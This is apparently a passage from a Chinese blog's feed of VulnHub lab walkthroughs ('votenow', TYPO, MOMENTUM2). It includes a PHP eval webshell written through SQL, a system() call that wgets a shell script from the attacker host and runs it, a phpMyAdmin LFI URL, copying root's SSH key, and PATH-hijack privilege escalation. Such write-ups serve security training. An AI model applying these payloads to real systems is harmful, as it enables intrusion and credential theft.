data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocC5iYWs=\">http://192.168.0.153/config.php.bak</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-729.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 发现了数据库的账户名密码 votebox:casoj3FFASPsbyoRP</p>\n<p>但是没有数据库的端口开通，发现没法利用，查看 80 端口的网站，看能否找到更多敏感的信息，发现了一个域名，我们就用这个域名做 DNS 解析指向其 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-730.png\" width=\"520\" alt=\"Image\">\n<p>修改本地 hosts 文件，指定规则如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-731.png\" width=\"320\" alt=\"Image\">\n<p>访问 <span class=\"exturl\" data-url=\"aHR0cDovL3ZvdGVub3cubG9jYWw=\">http://votenow.local</span> 成功显示出来该网站</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-732.png\" width=\"520\" alt=\"Image\">\n<p>做一波目录扫描，发现和原 ip 的扫描内容一模一样</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-733.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"wfuzz-扫描子域名\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-扫描子域名\">#</a> wfuzz 扫描子域名</h3>\n<p>既然是域名，何不进行一波子域名的收集，用 subDomainsBrute 爆破子域名</p>\n<p><code>python subDomainsBrute.py votenow.local</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-734.png\" width=\"580\" alt=\"Image\">\n<p>但是没有扫描到任何目录，需要注意的是我们去识别此域名的子域名，其解析的 ip 地址依然要指向靶机的 IP 地址</p>\n<p>用 wfuzz 来枚举子域名<br>\n <code>wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H &quot;Host: FUZZ.votenow.local&quot; --hw 854 --hc 400 votenow.local</code></p>\n<p>通过这种方法收集的子域名的解析地址都是目标靶机的 ip</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-735.png\" width=\"700\" alt=\"Image\">\n<p>将扫描到的子域名加入到本地 hosts 文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-736.png\" width=\"390\" alt=\"Image\">\n<p>访问网站 <span class=\"exturl\" data-url=\"aHR0cDovL2RhdGFzYWZlLnZvdGVub3cubG9jYWw=\">http://datasafe.votenow.local</span> , 输入之前泄漏的数据库账户密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-737.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 拿到 phpmyadmin 的权限</p>\n<h3 id=\"phpmyadmin后台写shell\"><a class=\"markdownIt-Anchor\" href=\"#phpmyadmin后台写shell\">#</a> phpmyadmin 后台写 shell</h3>\n<p>点击 SQL，尝试执行敏感的 sql 语句，写入 webshell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-738.png\" width=\"700\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示目录</span></span><br><span class=\"line\">show variables like &#x27;%datadir%&#x27;;</span><br><span class=\"line\">select @@basedir;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-739.png\" width=\"380\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">数据库当前操作用户拥有写权限：</span></span><br><span class=\"line\">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-740.png\" width=\"380\" alt=\"Image\">\n<ul>\n<li>secure_file_priv 参数：<br>\n<strong>NULL 不允许导入或导出；/tmp 只允许在 /tmp 目录导入导出；空 不限制目录</strong></li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入一句话后门：</span></span><br><span class=\"line\">select &#x27;&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;&#x27; INTO OUTFILE &#x27;/var/lib/mysql/a.php&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-741.png\" width=\"620\" alt=\"Image\">\n<p>写入失败，可能被过滤掉了，找到密码，看能否修改密码进行破解</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-742.png\" width=\"650\" alt=\"Image\">\n<p>用 john 破解密码破解失败（此密码应能破解，破解为 Stella）admin:Stella</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-743.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"phpmyadmin-漏洞提权\"><a class=\"markdownIt-Anchor\" href=\"#phpmyadmin-漏洞提权\">#</a> phpmyadmin 漏洞提权</h3>\n<p>接下来可以看一下这个 phpmyadmin 的版本是多少，如果较低的话是可以直接利用现成的 payload 进行提权的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-744.png\" width=\"680\" alt=\"Image\">\n<p>通过 searchsploit 搜索 phpmyadmin4.8.1 找到了 RCE 漏洞的 payload</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-745.png\" width=\"700\" alt=\"Image\">\n<p>将 paylaod 复制到一个目录下，查阅后开始利用<br>\n <code>python 50457.py datasafe.votenow.local 80 / votebox casoj3FFASPsbyoRP whoami</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-746.png\" width=\"550\" alt=\"Image\">\n<p>根据代码内容输入命令之后没有报错说明可以正常使用此 payload, 修改代码中的拿到权限后的执行的操作，让其反弹 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-747.png\" width=\"680\" alt=\"Image\">\n<p>但是依然没有反弹 shell 成功，需要进行手动复现</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在SQL语句上写入执行反弹shell的代码</span></span><br><span class=\"line\">select &#x27;&lt;?php system(&quot;wget 192.168.0.152/shell.sh; chmod +x shell.sh; bash shell.sh&quot;);exit;?&gt;&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-748.png\" width=\"550\" alt=\"Image\">\n<p>写入恶意 payload 成功后，拿取到此页面保存的 cookie 的值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-749.png\" width=\"550\" alt=\"Image\">\n<p>同时需要在 kali 机器上准备好反弹 shell 的代码，等待靶机执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-750.png\" width=\"440\" alt=\"Image\">\n<p>访问如下网址，最后的后缀是页面的 cookie 的值，成功拿到网站权限<br>\n <code>http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_q6brk6uh6kbpb5t9888v47b3epgcoltl</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-751.png\" width=\"700\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-752.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功拿到了 apache 用户的网站权限</p>\n<h3 id=\"恶意tar命令提权\"><a class=\"markdownIt-Anchor\" href=\"#恶意tar命令提权\">#</a> 恶意 tar 命令提权</h3>\n<p>搜索一下有没有相关文件的权限设置错误<br>\n <code>find / -group admin 2&gt;/dev/null | grep -v 'proc\\|home'</code></p>\n<p>发现找到一个 admin 组下的一个命令 tarS</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-753.png\" width=\"520\" alt=\"Image\">\n<p>查看 /etc/passwd 确认我们能提权的账户有哪些  <code>cat /etc/passwd | grep bash</code> <br>\n 发现有 admin 和 root 两个账户都存在 bash<br>\njohn 破解 phpmyadmin 后台时可得到 admin:Stella, <code>su admin</code>  尝试提权</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-754.png\" width=\"370\" alt=\"Image\">\n<p>确认一下 admin 用户下是否有某些可执行文件的特权</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">find</span></span><br><span class=\"line\">find / -group admin 2&gt;/dev/null | grep -v &#x27;proc\\|home&#x27;</span><br><span class=\"line\">/usr/bin/tarS -cvf key.tar /root/.ssh/id_rsa</span><br><span class=\"line\">tar -xvf key.tar</span><br></pre></td></tr></table></figure>\n<p>用此有错误权限的 tarS 命令去压缩并解压 root 账户下的 ssh 私钥</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-755.png\" width=\"570\" alt=\"Image\">\n<p>将私钥文件发送到自己的 kali 机器上，修改权限为 600 ，进行连接需要注意目标机器的 ssh 开放在了 2082 端口<br>\n <code>ssh -p 2082 root@192.168.0.154 -i root/.ssh/id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-756.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/127%20TYPO/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/127%20TYPO/",
            "title": "VULNHUB 27 TYPO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdHlwby0xLDQ3Mi8=\">https://www.vulnhub.com/entry/typo-1,472/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS90eXBvLTEtdnVsbmh1Yi13YWxrdGhyb3VnaC8=\">https://www.infosecarticles.com/typo-1-vulnhub-walkthrough/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 TYPO：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-662.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.153</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-663.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80,8000,8080,8081</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>依次打开 80,8000,8080,8081 的网站进行访问，收集相关信息</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTM=\">http://192.168.0.153</span> 进行信息收集，发现网站是一个 typo3 的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-664.png\" width=\"570\" alt=\"Image\">\n<p>打开 http://192.168.0.153:8000 搜集信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-665.png\" width=\"500\" alt=\"Image\">\n<p>打开 http://192.168.0.153:8080 搜集信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-666.png\" width=\"520\" alt=\"Image\">\n<p>打开 http://192.168.0.153:8081 搜集信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-667.png\" width=\"380\" alt=\"Image\">\n<p>收集目录: <code>dirsearch -u 192.168.0.153:8000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-668.png\" width=\"320\" alt=\"Image\">\n<p>依次打开收集到的目录看能否找到更多信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODAvcGhwaW5mby5waHA=\">http://192.168.31.176:8080/phpinfo.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-669.png\" width=\"520\" alt=\"Image\">\n<p>收集目录: <code>dirsearch -u 192.168.0.153:8081</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-670.png\" width=\"550\" alt=\"Image\">\n<h3 id=\"phpmyadmin-渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#phpmyadmin-渗透测试\">#</a> phpmyadmin 渗透测试</h3>\n<p>发现敏感地址，phpmyadmin 存在弱口令</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc2OjgwODEvcGhwbXlhZG1pbi8=\">http://192.168.31.176:8081/phpmyadmin/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-671.png\" width=\"520\" alt=\"Image\">\n<p>用弱口令 root：root 登陆成功拿到后台的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-672.png\" width=\"630\" alt=\"Image\">\n<p>对 phpmyadmin 进行写 shell 拿网站权限</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示目录</span></span><br><span class=\"line\">show variables like &#x27;%datadir%&#x27;;</span><br><span class=\"line\">select @@basedir;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-673.png\" width=\"320\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">是否可以写入</span></span><br><span class=\"line\">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">结果为/var/lib/mysql-files，只允许导出到此目录</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-674.png\" width=\"380\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否开启日志记录以及日志保存目录</span></span><br><span class=\"line\">SHOW VARIABLES LIKE &#x27;%general_log%&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">结果为OFF</span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-675.png\" width=\"300\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启写入日志的开关：</span></span><br><span class=\"line\">SET GLOBAL general_log = &quot;ON&quot;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-676.png\" width=\"440\" alt=\"Image\">\n<p>查看设置是否正确，是否开启成功，检测到已经开启了日志写入，并且写入的地址在下面的文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-677.png\" width=\"310\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改默认的日志写入地址</span></span><br><span class=\"line\">SET GLOBAL general_log_file=“1.php”</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-678.png\" width=\"420\" alt=\"Image\">\n<p>-&gt; phpmyadmin 拿 shell 失败，得采用其他的方式</p>\n<h3 id=\"覆盖admin密码\"><a class=\"markdownIt-Anchor\" href=\"#覆盖admin密码\">#</a> 覆盖 admin 密码</h3>\n<p>查看 sql 之后看到密码采用 argon 算法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-679.png\" width=\"650\" alt=\"Image\">\n<p>既然数据的密码采用的是 argon 的算法加密的，那么现在的思路就是通过 argon 算法生成一个加密后的密码并且替代原来的密码<br>\n在网站 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2FyZ29uMi1jZmZpLw==\">https://pypi.org/project/argon2-cffi/</span> 上看到了 argron2 的生成教程<br>\n通过 python 依次输入以下的命令可以将自定义的密码以 argon 加密</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-680.png\" width=\"650\" alt=\"Image\">\n<p>用 pip 来安装 argon： <code>python3 -m pip install argon2-cffi</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-681.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">打开python的命令行，依次输入以下命令</span></span><br><span class=\"line\">from argon2 import PasswordHasher</span><br><span class=\"line\">ph = PasswordHasher()</span><br><span class=\"line\">hash = ph.hash(&quot;typo&quot;)</span><br><span class=\"line\">print(hash)</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-682.png\" width=\"660\" alt=\"Image\">\n<p>打印出来的即为密码为 typo 的 argon 算法之后的加密字符:<br>\n <code>$argon2id$v=19$m=65536,t=3,p=4$BLSCVncgUy7tfYFMab+XMQ$LDy6bITURoFWRdb4JNHQ53e+t2TF9oiWeBdzLxHVoUM</code></p>\n<p>打开数据库中修改用户名密码的位置，将上述产生的 typo 加密后的字符替换原先的密码，点击确定即修改成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-683.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 现在就有了一个用户名密码分别为 admin:typo 的组合</p>\n<p>但是这个账户应该在哪个位置登陆还不确定，看起来像是一个网站后台的登陆地址；继续之前 80 端口的网站目录扫描，发现了一个 /typo3 的后台地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-684.png\" width=\"520\" alt=\"Image\">\n<p>（这里换了地方测试，重启了机器，重新分配了 ip 地址，靶机的 ip 地址发生了变化，正常的操作 ip 地址是不会发生变化的）<br>\n用 admin：typo 进入此后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-685.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 拿到了后台地址</p>\n<h3 id=\"修改过滤规则上传木马\"><a class=\"markdownIt-Anchor\" href=\"#修改过滤规则上传木马\">#</a> 修改过滤规则上传木马</h3>\n<p>进入后台之后看到是一个普通的后台管理地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-686.png\" width=\"700\" alt=\"Image\">\n<p>在 fileList 中找到了可以上传的位置，并且注明了上传文件的位置在 fileadmin 目录下，尝试从这个位置上传一个 php 后门</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-687.png\" width=\"700\" alt=\"Image\">\n<p>准备好 php 一句话木马，这里的 php 木马来源于 kali 机器上默认的木马，由于提前将此后门放在了公网 ip 上，就在自己的公网 ip 上直接拉下来即可，修改其主机和端口号为 kali 机器的地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-688.png\" width=\"520\" alt=\"Image\">\n<p>点击上传文件，从本地选择 php 文件后，发现服务器拒绝了，说明有判断需要尝试绕过，可以用 00 截断的方式，这个地方尝试去寻找过滤文件的方式是否在后台能修改，进行绕过</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-689.png\" width=\"700\" alt=\"Image\">\n<p>在设置里边查找，看到了 Configure Installation-Wide Options 中有关于文件上传的格式限制，其正则表示如下：<br>\n <code>\\.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\\..*)?$|\\.pl$|^\\.htaccess$</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-690.png\" width=\"700\" alt=\"Image\">\n<p>将原有的过滤规则全部清除</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-691.png\" width=\"700\" alt=\"Image\">\n<p>确定之后，接下来文件上传将不会受到任何限制</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-692.png\" width=\"700\" alt=\"Image\">\n<p>再次尝试上传 shell.php 就上传成功了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-693.png\" width=\"700\" alt=\"Image\">\n<p>监听木马文件中的端口，同时去执行上传成功的木马，成功拿到网站权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-694.png\" width=\"520\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-695.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用一些命令将终端变为一个标准的shell</span></span><br><span class=\"line\">SHELL=/bin/bash script -q /dev/null</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-696.png\" width=\"420\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">收集信息</span></span><br><span class=\"line\">cat /etc/passwd | grep /bin/bash</span><br><span class=\"line\">cat /etc/passwd | grep www</span><br></pre></td></tr></table></figure>\n<p>判断出来没有其他的用户，需要直接拿到 root 的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-697.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看定时任务</span></span><br><span class=\"line\">cat /etc/crontab</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-698.png\" width=\"620\" alt=\"Image\">\n<p>发现没有任何任务被加载</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否有设置错误的s权限的文件</span></span><br><span class=\"line\">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-699.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; 找到一个 apache2-restart</p>\n<h3 id=\"文件权限设置错误提权\"><a class=\"markdownIt-Anchor\" href=\"#文件权限设置错误提权\">#</a> 文件权限设置错误提权</h3>\n<p>很显然这是一个自己封装的命令，需要进行读取或者反编译这个命令里边封装了哪些命令，通过 strings 将命令读取</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-700.png\" width=\"520\" alt=\"Image\">\n<p>是一个 service 的命令，意味着我们去执行 apache 2-restart 命令的时候，会去环境变量里边去找 service，而且去执行这个 service 的时候是以 root 权限执行的，</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过修改环境变量提权</span></span><br><span class=\"line\">echo &quot;/bin/bash&quot; &gt; /tmp/service</span><br><span class=\"line\">chmod +x /tmp/service</span><br><span class=\"line\">export PATH=/tmp/:$PATH</span><br><span class=\"line\">/usr/bin/local/apache2-restart</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-701.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 成功拿到 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/130%20MOMENTUM2/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/130%20MOMENTUM2/",
            "title": "VULNHUB 30 MOMENTUM2",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbW9tZW50dW0tMiw3MDIv\">https://www.vulnhub.com/entry/momentum-2,702/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3F3d2VnZ2ZlL2FydGljbGUvZGV0YWlscy8xMTkzMjAwNDU=\">https://blog.csdn.net/qwweggfe/article/details/119320045</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 MOMENTUM2：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code> <br>\n 这次又换了个场所进行测试，所以识别到的 ip 就比较多了，通过 MAC 地址，可确定虚拟在 win 宿主机上的靶机地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-757.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.17</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.17</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-758.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc=\">http://192.168.31.17</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-759.png\" width=\"520\" alt=\"Image\">\n<p>点击检查源代码，看能不能有所发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-760.png\" width=\"520\" alt=\"Image\">\n<p>没有什么敏感的信息，就去爆破一波目录，还是用 gobuster 工具，指定后缀，指定字典式的暴力破解，也可以用 dirsearch 等工具，前提是找到一个比较好的字典</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-761.png\" width=\"700\" alt=\"Image\">\n<p>发现了三个敏感的目录，依次访问这几个目录</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvYWpheC5waHAuYmFr\">http://192.168.31.17/ajax.php.bak</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-762.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"敏感数据泄露\"><a class=\"markdownIt-Anchor\" href=\"#敏感数据泄露\">#</a> 敏感数据泄露</h3>\n<p>直接可以下载的一个备份文件，下载下来查看一下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-763.png\" width=\"570\" alt=\"Image\">\n<p>发现是一个 php 的备份文件，里边写了一个过滤文件的规则，如果 admin 按照如下设置，并且添加一个大写字母在最后，那么就去判断 post, 中是否有 secure 的字段为 val1d，如果有的话就允许上传 php 文件</p>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvZGFzaGJvYWQuaHRtbA==\">http://192.168.31.17/dashboad.html</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-764.png\" width=\"520\" alt=\"Image\">\n<p>可以上传文件，直接上传一个 shell.php 文件是被拒绝的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-765.png\" width=\"520\" alt=\"Image\">\n<p>继续查看第三个敏感网址: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvb3dscy8=\">http://192.168.31.17/owls/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-766.png\" width=\"360\" alt=\"Image\">\n<p>很有可能是上传文件之后的位置，可在这里进行文件的执行</p>\n<p>接下来的思路就是通过备份文件的提示进行 php 上传文件的绕过，在 dashboard.html 界面进行文件的上传，在再 oswl 页面进行文件的执行</p>\n<h3 id=\"crunch-生成字典\"><a class=\"markdownIt-Anchor\" href=\"#crunch-生成字典\">#</a> crunch 生成字典</h3>\n<p>先通过 crunch 生成一个从 A-Z 的字典<br>\n <code>crunch 1 1 -t , -o pass.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-767.png\" 